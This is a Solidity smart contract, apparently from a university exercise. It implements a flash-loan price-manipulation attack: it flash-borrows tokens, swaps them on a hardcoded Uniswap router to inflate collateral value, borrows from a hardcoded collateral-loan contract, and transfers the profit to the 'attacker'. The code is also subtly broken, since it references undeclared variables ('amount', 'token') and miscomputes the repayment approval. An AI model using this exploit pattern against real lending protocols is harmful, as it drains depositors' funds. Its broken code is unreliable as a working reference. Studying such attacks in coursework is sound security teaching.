// SPDX-License-Identifier: UZH
pragma solidity ^0.8.0;

import "./IERC3156FlashLender.sol";
import "../IERC20.sol";
import '../uniswap-v2/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '../collateral-loan/ICollateralLoan.sol';

// The borrower implementation
contract FlashBorrower is IERC3156FlashBorrower {
    IERC3156FlashLender lender;
    address _tokenToSwap;
    address ROUTER = 0x1ceae99b55aC4a79c0f74460E628067e30e38925;
    address COLLATERAL_LOAN = 0xBeB2c168eB45Cab948A5aBf0e3038e85973b35c6;
   
    constructor (IERC3156FlashLender lender_) {
        lender = lender_;
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(address initiator, address tokenToFlashLoan, uint256 amountToFlashLoan, uint256 fee) external override returns(bytes32) {
        require(msg.sender == address(lender), "FlashBorrower: Untrusted lender");
        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");

        // 1. swap on uniswap
        uint amountToSwap = (amountToFlashLoan / 100) * 90;
        address[] memory path = new address[](2);
        path[0] = tokenToFlashLoan;
        path[1] = _tokenToSwap;
        
        IERC20(tokenToFlashLoan).approve(ROUTER, amountToSwap);
        IUniswapV2Router02(ROUTER).swapExactTokensForTokens(
            amountToSwap,
            1000000000000000000,
            path,
            address(this),
            block.timestamp + 100
        );
        
        // 2. loan given collateral
        address tokenToBorrow = tokenToFlashLoan;
        address tokenAsCollateral = _tokenToSwap;
        uint collateralAmount = IERC20(tokenAsCollateral).balanceOf(address(this));
        IERC20(tokenAsCollateral).approve(COLLATERAL_LOAN, collateralAmount);
        ICollateralLoan(COLLATERAL_LOAN).loan(tokenToBorrow, tokenAsCollateral, collateralAmount);
        
        // 3. approve amount (for repaying the flash loan)
        uint256 allowance = IERC20(tokenToFlashLoan).allowance(address(this), address(lender));
        uint256 repayment = amount + fee;
        uint256 amountToRepay = allowance + repayment;
        IERC20(tokenToFlashLoan).approve(address(lender), amountToRepay);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan
    function flashLoanAttack(address tokenToFlashLoan, uint256 amountToFlashLoan, address tokenToSwap) public {
        _tokenToSwap = tokenToSwap;
        lender.flashLoan(this, tokenToFlashLoan, amountToFlashLoan);

        // 4. transfer positive delta to attacker
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
    
}

